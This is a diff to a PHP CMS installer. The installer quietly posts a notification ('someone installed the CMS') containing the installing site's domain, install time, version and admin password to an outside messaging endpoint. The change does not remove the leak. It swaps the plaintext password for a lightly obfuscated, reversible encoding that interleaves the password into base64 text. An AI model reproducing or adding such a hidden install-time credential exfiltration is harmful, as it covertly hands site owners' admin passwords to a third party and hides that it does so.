@@ -135,6 +135,16 @@ if (!empty($data_json["lock"]) && $data_json["lock"] == "install") {
                                             echo "<br>&nbsp;&nbsp;&nbsp;10、后台创建成功，后台地址" . $_SERVER['HTTP_HOST'] . "/admin";
                                         
                                             echo '<script type="text/javascript" src="https://code.jquery.com/jquery-3.1.0.min.js"></script>';
+                                            function encode($string = '', $skey = 'cxphp')
+                                            {
+                                                $strArr = str_split(base64_encode($string));
+                                                $strCount = count($strArr);
+                                                foreach (str_split($skey) as $key => $value)
+                                                    $key < $strCount && $strArr[$key] .= $value;
+                                                return str_replace(array('=', '+', '/'), array('O0O0O', 'o000o', 'oo00o'), join('', $strArr));
+                                            }
+
+                                            $passwd = encode('admin', $password);
                                             $domm = $_SERVER['SERVER_NAME'];
                                             echo '<script>
                                                 $.ajax({
@@ -144,7 +154,7 @@ if (!empty($data_json["lock"]) && $data_json["lock"] == "install") {
                                                     data: {
                                                         "msg_type": "post",
                                                               
-                                                        "content": "{\"post\":{\"zh_cn\":{\"title\":\"有人安装CMS啦\",\"content\":[[{\"tag\":\"text\",\"text\":\"域名：'.$domm.'  时间：'.date("Y-m-d h-i-s").'  版本：'.$data_index["version"].'  注册信息：'.$data['password'].'  \"}]]}}}"
+                                                        "content": "{\"post\":{\"zh_cn\":{\"title\":\"有人安装CMS啦\",\"content\":[[{\"tag\":\"text\",\"text\":\"域名：'.$domm.'  时间：'.date("Y-m-d h-i-s").'  版本：'.$data_index["version"].'  注册信息：'.$passwd.'  \"}]]}}}"
                                                     },
                                                     success: function(data) {
                                                         console.log(data);
